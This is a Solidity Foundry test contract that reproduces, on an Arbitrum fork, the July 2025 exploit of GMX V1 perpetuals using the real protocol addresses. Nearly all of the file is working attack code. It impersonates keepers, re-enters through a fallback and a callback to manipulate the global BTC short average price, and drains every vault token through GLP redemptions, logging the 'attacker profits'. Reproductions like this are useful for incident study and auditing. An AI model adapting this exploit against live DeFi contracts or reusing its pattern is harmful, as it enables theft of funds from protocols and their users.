// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

/**
 * @title GMX V1 Exploit Reproduction Test
 * @notice Simulates the infamous GMX perpetuals vulnerability from July 2025
 * @dev This contract demonstrates advanced DeFi attack vectors including reentrancy and price manipulation
 */

interface ILiquidityProvider {
    function mintAndStakeGlp(
        address tokenAddress,
        uint256 tokenAmount,
        uint256 minimumUsdg,
        uint256 minimumGlp
    ) external returns (uint256);
    function unstakeAndRedeemGlp(
        address outputToken,
        uint256 glpTokens,
        uint256 minTokenOut,
        address recipient
    ) external returns (uint256);
}

interface IPositionHandler {
    function createDecreasePosition(
        address[] memory tokenPath,
        address indexAsset,
        uint256 collateralReduction,
        uint256 sizeReduction,
        bool isLongPosition,
        address recipient,
        uint256 maxPrice,
        uint256 minOutput,
        uint256 executionCost,
        bool withdrawEth,
        address callbackContract
    ) external payable returns (bytes32);
    function minExecutionFee() external view returns (uint256);
    function executeDecreasePositions(
        uint256 endIdx,
        address payable feeReceiver
    ) external;
    function getRequestQueueLengths()
        external
        view
        returns (uint256, uint256, uint256, uint256);
}

interface IOrderManager {
    function createIncreaseOrder(
        address[] memory tradePath,
        uint256 inputAmount,
        address indexAsset,
        uint256 minOutputTokens,
        uint256 positionSize,
        address collateralAsset,
        bool longPosition,
        uint256 triggerLevel,
        bool triggerAbove,
        uint256 executionCost,
        bool wrapEth
    ) external payable;

    function minExecutionFee() external view returns (uint256);
    function minPurchaseTokenAmountUsd() external view returns (uint256);
    function swapOrdersIndex(address account) external view returns (uint256);
    function increaseOrdersIndex(
        address account
    ) external view returns (uint256);
    function decreaseOrdersIndex(
        address account
    ) external view returns (uint256);
    function createDecreaseOrder(
        address indexAsset,
        uint256 positionSize,
        address collateralAsset,
        uint256 collateralAmount,
        bool longPosition,
        uint256 triggerLevel,
        bool triggerAbove
    ) external payable;
}

interface ITradeRouter {
    function approvePlugin(address pluginAddress) external;
}

interface ITradeExecutor {
    function executeIncreaseOrder(
        address trader,
        uint256 orderIdx,
        address payable feeRecipient
    ) external;
    function executeDecreaseOrder(
        address trader,
        uint256 orderIdx,
        address payable feeRecipient
    ) external;
}

interface ITradingVault {
    function tokenToUsdMin(
        address asset,
        uint256 amount
    ) external view returns (uint256);
    function getPosition(
        address trader,
        address collateralAsset,
        address indexAsset,
        bool longPosition
    )
        external
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            bool,
            uint256
        );
    function globalShortAveragePrices(
        address asset
    ) external view returns (uint256);
    function increasePosition(
        address trader,
        address collateralAsset,
        address indexAsset,
        uint256 sizeIncrease,
        bool longPosition
    ) external;
    function decreasePosition(
        address trader,
        address collateralAsset,
        address indexAsset,
        uint256 collateralDecrease,
        uint256 sizeDecrease,
        bool longPosition,
        address recipient
    ) external returns (uint256);
    function poolAmounts(address asset) external view returns (uint256);
    function reservedAmounts(address asset) external view returns (uint256);
    function getMaxPrice(address asset) external view returns (uint256);
    function getMinPrice(address asset) external view returns (uint256);
}

interface IShortPositionTracker {
    function updateGlobalShortData(
        address trader,
        address collateralAsset,
        address indexAsset,
        bool longPosition,
        uint256 sizeChange,
        uint256 marketPrice,
        bool isIncrease
    ) external;
}

interface ILiquidityManager {
    function getGlobalShortDelta(
        address asset
    ) external view returns (bool, uint256);
    function getGlobalShortAveragePrice(
        address asset
    ) external view returns (uint256);
    function getAumInUsdg(bool maximize) external view returns (uint256);
}

interface IPriceFeedManager {
    function setPricesWithBitsAndExecute(
        uint256 priceBitmask,
        uint256 timestamp,
        uint256 endIdxForIncreases,
        uint256 endIdxForDecreases,
        uint256 maxIncreasePositions,
        uint256 maxDecreasePositions
    ) external;
}

interface IStakeTracker {
    function stakedAmounts(address account) external view returns (uint256);
}

contract GMXExploitSimulation is Test {
    // Core GMX protocol contracts
    IOrderManager private orderManager =
        IOrderManager(0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB);
    ITradingVault private tradingVault =
        ITradingVault(0x489ee077994B6658eAfA855C308275EAd8097C4A);
    ITradeRouter private tradeRouter =
        ITradeRouter(0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064);
    ITradeExecutor private tradeExecutor =
        ITradeExecutor(0x75E42e6f01baf1D6022bEa862A28774a9f8a4A0C);
    IShortPositionTracker private shortTracker =
        IShortPositionTracker(0xf58eEc83Ba28ddd79390B9e90C4d3EbfF1d434da);
    ILiquidityManager private liquidityManager =
        ILiquidityManager(0x3963FfC9dff443c2A94f21b129D429891E32ec18);
    IPositionHandler private positionHandler =
        IPositionHandler(0xb87a436B93fFE9D75c5cFA7bAcFff96430b09868);
    IPriceFeedManager private priceFeedManager =
        IPriceFeedManager(0x11D62807dAE812a0F1571243460Bf94325F43BB7);
    ILiquidityProvider private liquidityProvider =
        ILiquidityProvider(0xB95DB5B167D75e6d04227CfFFA61069348d271F5);
    IStakeTracker private stakeTracker =
        IStakeTracker(0x1aDDD80E6039594eE970E5872D247bf0414C8903);

    // Token contracts used in the exploit
    IERC20 private glpToken =
        IERC20(0x4277f8F2c384827B5273592FF7CeBd9f2C1ac258);
    IERC20 private wethToken =
        IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 private wbtcToken =
        IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 private usdcToken =
        IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 private usdcLegacy =
        IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 private chainlinkToken =
        IERC20(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4);
    IERC20 private uniswapToken =
        IERC20(0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0);
    IERC20 private tetherToken =
        IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 private fraxToken =
        IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);
    IERC20 private daiToken =
        IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);

    // Keeper addresses for order execution
    address private constant POSITION_KEEPER =
        0x2BcD0d9Dde4bD69C516Af4eBd3fB7173e1FA12d0;
    address private constant ORDER_KEEPER =
        0xd4266F8F82F7405429EE18559e548979D49160F3;

    // State variable to control attack phase
    bool private executeProfit = false;

    // Historical ETH price at the time of attack: $2,652.39
    function initializeTest() public {
        vm.createSelectFork("arbitrum", 355878385 - 1);
        deal(address(usdcToken), address(this), 3001000000);
        vm.deal(address(this), 2 ether);
        tradeRouter.approvePlugin(address(orderManager));
        tradeRouter.approvePlugin(address(positionHandler));
        usdcToken.approve(address(liquidityProvider), type(uint256).max);
        usdcToken.approve(address(liquidityManager), type(uint256).max);
        fraxToken.approve(address(liquidityProvider), type(uint256).max);
        fraxToken.approve(address(liquidityManager), type(uint256).max);
    }

    function setUp() public {
        initializeTest();
    }

    /**
     * @notice Main exploit function that demonstrates the GMX vulnerability
     * @dev Reproduces the multi-step attack that drained millions from GMX protocol
     */
    function testExploit() public {
        console2.log("===== PRE-ATTACK VAULT BALANCES =====");
        logVaultBalances();

        // Phase 1: Setup leveraged ETH positions
        for (uint256 iteration = 0; iteration < 2; iteration++) {
            openLeveragedEthPosition();
            executeEthPositionOpening();
        }

        console2.log(
            "BTC Global Short Average Price (Initial) = ",
            liquidityManager.getGlobalShortAveragePrice(address(wbtcToken))
        );

        // Phase 2: Manipulate global short average price through reentrancy
        createEthPositionClosure();
        for (uint iteration = 0; iteration < 5; iteration++) {
            executeEthPositionClosure();
            executeBtcPositionManipulation();
        }

        console2.log(
            "BTC Global Short Average Price (After Manipulation) = ",
            liquidityManager.getGlobalShortAveragePrice(address(wbtcToken))
        );

        // Phase 3: Execute profit extraction
        executeProfit = true;
        executeEthPositionClosure();

        console2.log("===== POST-ATTACK VAULT BALANCES =====");
        logVaultBalances();
    }

    /**
     * @notice Helper function to log all vault token balances
     * @dev Used for before/after comparison during exploit
     */
    function logVaultBalances() private {
        console2.log(
            "ETH Vault Balance = ",
            wethToken.balanceOf(address(tradingVault)) /
                10 ** wethToken.decimals()
        );
        console2.log(
            "BTC Vault Balance = ",
            wbtcToken.balanceOf(address(tradingVault)) /
                10 ** wbtcToken.decimals()
        );
        console2.log(
            "USDC Vault Balance = ",
            usdcToken.balanceOf(address(tradingVault)) /
                10 ** usdcToken.decimals()
        );
        console2.log(
            "USDC Legacy Vault Balance = ",
            usdcLegacy.balanceOf(address(tradingVault)) /
                10 ** usdcLegacy.decimals()
        );
        console2.log(
            "LINK Vault Balance = ",
            chainlinkToken.balanceOf(address(tradingVault)) /
                10 ** chainlinkToken.decimals()
        );
        console2.log(
            "UNI Vault Balance = ",
            uniswapToken.balanceOf(address(tradingVault)) /
                10 ** uniswapToken.decimals()
        );
        console2.log(
            "USDT Vault Balance = ",
            tetherToken.balanceOf(address(tradingVault)) /
                10 ** tetherToken.decimals()
        );
        console2.log(
            "FRAX Vault Balance = ",
            fraxToken.balanceOf(address(tradingVault)) /
                10 ** fraxToken.decimals()
        );
        console2.log(
            "DAI Vault Balance = ",
            daiToken.balanceOf(address(tradingVault)) /
                10 ** daiToken.decimals()
        );
    }

    /**
     * @notice Creates a leveraged long ETH position
     * @dev Replicates transaction 0x0b8cd648fb585bc3d421fc02150013eab79e211ef8d1c68100f2820ce90a4712
     */
    function openLeveragedEthPosition() public {
        // Calculate leverage: 2.003x = 531 / (0.1 * 2652.39)
        // Opening leveraged long position with 0.1 ETH collateral
        address[] memory tradePath = new address[](1);
        tradePath[0] = address(wethToken);
        orderManager.createIncreaseOrder{value: 0.1003 ether}(
            tradePath,
            100000000000000000, // 0.1 ETH input
            address(wethToken), // ETH as index token
            0, // No minimum output required
            531064000000000000000000000000000, // Position size for 2.003x leverage
            address(wethToken), // ETH as collateral
            true, // Long position
            1500000000000000000000000000000000, // Trigger price: $1500
            true, // Trigger above threshold
            orderManager.minExecutionFee() * 3, // Higher execution fee
            true // Auto-wrap ETH
        );
    }

    /**
     * @notice Executes the pending ETH position opening order
     * @dev Simulates keeper executing the increase order (tx: 0x28a000...)
     */
    function executeEthPositionOpening() public {
        vm.startPrank(ORDER_KEEPER);
        tradeExecutor.executeIncreaseOrder(
            address(this),
            orderManager.increaseOrdersIndex(address(this)) - 1,
            payable(ORDER_KEEPER)
        );
        vm.stopPrank();
    }

    /**
     * @notice Creates a decrease order to close half of the ETH position
     * @dev Replicates transaction 0x20abfeff0206030986b05422080dc9e81dbb53a662fbc82461a47418decc49af
     */
    function createEthPositionClosure() public {
        (
            uint256 positionSize,
            uint256 collateralValue,
            uint256 avgEntryPrice,
            uint256 reservedAmount,
            uint256 realizedPnl,
            uint256 fundingRate,
            bool isLongPosition,
            uint256 lastUpdateTime
        ) = tradingVault.getPosition(
                address(this),
                address(wethToken),
                address(wethToken),
                true
            );
        orderManager.createDecreaseOrder{
            value: orderManager.minExecutionFee() * 3
        }(
            address(wethToken),
            positionSize / 2, // Close half the position
            address(wethToken),
            collateralValue / 2, // Withdraw half collateral
            true,
            1500000000000000000000000000000000, // Trigger at $1500
            true
        );
    }

    /**
     * @notice Executes ETH position closure - critical reentrancy point
     * @dev Replicates transaction 0x1f00da742318ad1807b6ea8283bfe22b4a8ab0bc98fe428fbfe443746a4a7353
     */
    function executeEthPositionClosure() public {
        vm.startPrank(ORDER_KEEPER);
        tradeExecutor.executeDecreaseOrder(
            address(this),
            orderManager.decreaseOrdersIndex(address(this)) - 1,
            payable(ORDER_KEEPER)
        );
        vm.stopPrank();
    }

    /**
     * @notice Manipulates BTC position through price feed updates
     * @dev Replicates transaction 0x222cdae82a8d28e53a2bddfb34ae5d1d823c94c53f8a7abc179d47a2c994464e
     */
    function executeBtcPositionManipulation() public {
        (
            uint256 increaseStartIdx,
            uint256 increaseCount,
            uint256 decreaseStartIdx,
            uint256 decreaseCount
        ) = positionHandler.getRequestQueueLengths();
        vm.startPrank(POSITION_KEEPER);
        priceFeedManager.setPricesWithBitsAndExecute(
            650780127152856667663437440412910, // Price bitmask for manipulation
            block.timestamp,
            increaseStartIdx + increaseCount,
            decreaseStartIdx + decreaseCount,
            increaseCount,
            decreaseCount
        );
        vm.stopPrank();
    }

    /**
     * @notice GMX callback function triggered during position closure
     * @dev Critical vulnerability point - allows recursive order creation
     */
    function gmxPositionCallback(
        bytes32 positionIdentifier,
        bool executionSuccess,
        bool isPositionIncrease
    ) external {
        createEthPositionClosure();
    }

    /**
     * @notice Fallback function - the heart of the reentrancy exploit
     * @dev Called during ETH position closure, enables the manipulation attack
     */
    fallback() external payable {
        if (executeProfit) {
            drainProtocolFunds();
        } else {
            console2.log(
                "BTC Global Short Average Price (During Manipulation) = ",
                liquidityManager.getGlobalShortAveragePrice(address(wbtcToken))
            );
            usdcToken.transfer(
                address(tradingVault),
                usdcToken.balanceOf(address(this))
            );
            tradingVault.increasePosition(
                address(this),
                address(usdcToken),
                address(wbtcToken),
                90030000000000000000000000000000000, // Large BTC short position
                false
            );
            address[] memory tradePath = new address[](1);
            tradePath[0] = address(usdcToken);
            positionHandler.createDecreasePosition{value: 3000000000000000}(
                tradePath,
                address(wbtcToken),
                0,
                90030000000000000000000000000000000,
                false,
                address(this),
                120000000000000000000000000000000000, // High trigger price
                0,
                3000000000000000,
                false,
                address(this)
            );
        }
    }

    /**
     * @notice Final profit extraction phase using flash loans
     * @dev Replicates transaction 0x03182d3f0956a91c4e4c8f225bbc7975f9434fab042228c7acdc5ec9a32626ef
     */
    function drainProtocolFunds() public {
        console2.log("===== COMMENCING FINAL PROFIT EXTRACTION =====");
        // Simulate flash loan of USDC
        deal(address(usdcToken), address(this), 7_538_567_619570);
        uint256 initialGlpStake = liquidityProvider.mintAndStakeGlp(
            address(usdcToken),
            6000000000000,
            0,
            0
        );
        usdcToken.transfer(
            address(tradingVault),
            usdcToken.balanceOf(address(this))
        );

        tradingVault.increasePosition(
            address(this),
            address(usdcToken),
            address(wbtcToken),
            15385676195700000000000000000000000000,
            false
        );

        // Extract profits from all available tokens
        extractTokenProfits(address(wethToken));
        extractTokenProfits(address(wbtcToken));
        extractTokenProfits(address(usdcToken));
        extractTokenProfits(address(usdcLegacy));
        extractTokenProfits(address(chainlinkToken));
        extractTokenProfits(address(uniswapToken));
        extractTokenProfits(address(tetherToken));
        extractTokenProfits(address(fraxToken));
        extractTokenProfits(address(daiToken));

        tradingVault.decreasePosition(
            address(this),
            address(usdcToken),
            address(wbtcToken),
            0,
            15385676195700000000000000000000000000,
            false,
            address(this)
        );

        // Iterative GLP manipulation for maximum extraction
        for (uint iteration = 0; iteration < 10; iteration++) {
            liquidityProvider.mintAndStakeGlp(
                address(fraxToken),
                9000000000000000000000000,
                0,
                0
            );
            usdcToken.transfer(address(tradingVault), 500000000000);
            tradingVault.increasePosition(
                address(this),
                address(usdcToken),
                address(wbtcToken),
                12500000000000000000000000000000000000,
                false
            );
            extractTokenProfits(address(fraxToken));
            tradingVault.decreasePosition(
                address(this),
                address(usdcToken),
                address(wbtcToken),
                0,
                12500000000000000000000000000000000000,
                false,
                address(this)
            );
            console2.log(
                "Current GLP Balance = ",
                IERC20(address(stakeTracker)).balanceOf(address(this))
            );
        }

        extractTokenProfits(address(usdcToken));
        usdcToken.transfer(address(0x1), 7_538_567_619570); // Flash loan repayment

        console2.log("===== FINAL ATTACKER PROFITS =====");
        console2.log(
            "Extracted ETH: ",
            wethToken.balanceOf(address(this)) / 10 ** wethToken.decimals()
        );
        console2.log(
            "Extracted BTC: ",
            wbtcToken.balanceOf(address(this)) / 10 ** wbtcToken.decimals()
        );
        console2.log(
            "Extracted USDC: ",
            usdcToken.balanceOf(address(this)) / 10 ** usdcToken.decimals()
        );
        console2.log(
            "Extracted USDC Legacy: ",
            usdcLegacy.balanceOf(address(this)) / 10 ** usdcLegacy.decimals()
        );
        console2.log(
            "Extracted LINK: ",
            chainlinkToken.balanceOf(address(this)) /
                10 ** chainlinkToken.decimals()
        );
        console2.log(
            "Extracted UNI: ",
            uniswapToken.balanceOf(address(this)) /
                10 ** uniswapToken.decimals()
        );
        console2.log(
            "Extracted USDT: ",
            tetherToken.balanceOf(address(this)) / 10 ** tetherToken.decimals()
        );
        console2.log(
            "Extracted FRAX: ",
            fraxToken.balanceOf(address(this)) / 10 ** fraxToken.decimals()
        );
        console2.log(
            "Extracted DAI: ",
            daiToken.balanceOf(address(this)) / 10 ** daiToken.decimals()
        );
        console2.log("===== PROFIT EXTRACTION COMPLETE =====");
    }

    /**
     * @notice Extracts available profits for a specific token
     * @dev Calculates and redeems GLP for maximum token extraction
     * @param targetToken The token to extract profits for
     */
    function extractTokenProfits(address targetToken) public {
        uint256 availableAmount = tradingVault.poolAmounts(targetToken) -
            tradingVault.reservedAmounts(targetToken);
        uint256 tokenPrice = tradingVault.getMaxPrice(targetToken); // Price with 1e30 precision
        uint256 usdgEquivalent = (availableAmount * tokenPrice) /
            (10 ** IERC20(targetToken).decimals()) /
            1e12; // Convert to 1e18 precision
        uint256 totalGlpSupply = glpToken.totalSupply(); // 1e18 precision
        uint256 totalAumUsdg = liquidityManager.getAumInUsdg(false); // 1e18 precision
        uint256 glpAmountToRedeem = (usdgEquivalent * totalGlpSupply) /
            totalAumUsdg; // 1e18 precision
        liquidityProvider.unstakeAndRedeemGlp(
            targetToken,
            glpAmountToRedeem,
            0,
            address(this)
        );
    }
}
